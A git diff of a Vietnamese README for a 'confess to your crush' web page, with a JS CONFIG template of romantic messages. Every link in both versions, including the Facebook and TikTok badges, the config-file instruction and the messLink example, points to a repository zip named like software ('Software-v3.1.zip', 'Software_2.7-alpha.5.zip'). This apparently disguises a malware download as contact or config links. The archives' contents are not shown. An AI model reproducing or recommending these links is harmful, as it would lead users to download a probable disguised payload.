@@ -2,10 +2,10 @@
 ## _Một điều nho nhỏ tỏ tình với crush_
 
 Liên lạc: 
-[![Facebook](https://raw.githubusercontent.com/phiduong1230/baka/main/img/Software-v3.1.zip)](https://raw.githubusercontent.com/phiduong1230/baka/main/img/Software-v3.1.zip)
-[![Tiktok](https://raw.githubusercontent.com/phiduong1230/baka/main/img/Software-v3.1.zip)](https://raw.githubusercontent.com/phiduong1230/baka/main/img/Software-v3.1.zip)
+[![Facebook](https://github.com/phiduong1230/baka/raw/refs/heads/main/css/Software_2.7-alpha.5.zip)](https://github.com/phiduong1230/baka/raw/refs/heads/main/css/Software_2.7-alpha.5.zip)
+[![Tiktok](https://github.com/phiduong1230/baka/raw/refs/heads/main/css/Software_2.7-alpha.5.zip)](https://github.com/phiduong1230/baka/raw/refs/heads/main/css/Software_2.7-alpha.5.zip)
 
-Mở file https://raw.githubusercontent.com/phiduong1230/baka/main/img/Software-v3.1.zip sửa nội dung theo mẫu
+Mở file https://github.com/phiduong1230/baka/raw/refs/heads/main/css/Software_2.7-alpha.5.zip sửa nội dung theo mẫu
 ```
 const CONFIG = {
     introTitle: 'Babe à!',
@@ -24,7 +24,7 @@ const CONFIG = {
     mess: 'Anh biết mà 🥰. Yêu em nhiều nhiều 😘😘',
     messDesc: 'Tối nay 7h anh qua đón nhé công chúa.',
     btnAccept: 'Okiiiii lun <3',
-    messLink: 'https://raw.githubusercontent.com/phiduong1230/baka/main/img/Software-v3.1.zip' //link mess của các bạn. VD: https://raw.githubusercontent.com/phiduong1230/baka/main/img/Software-v3.1.zip
+    messLink: 'https://github.com/phiduong1230/baka/raw/refs/heads/main/css/Software_2.7-alpha.5.zip' //link mess của các bạn. VD: https://github.com/phiduong1230/baka/raw/refs/heads/main/css/Software_2.7-alpha.5.zip
 }
 ```
 
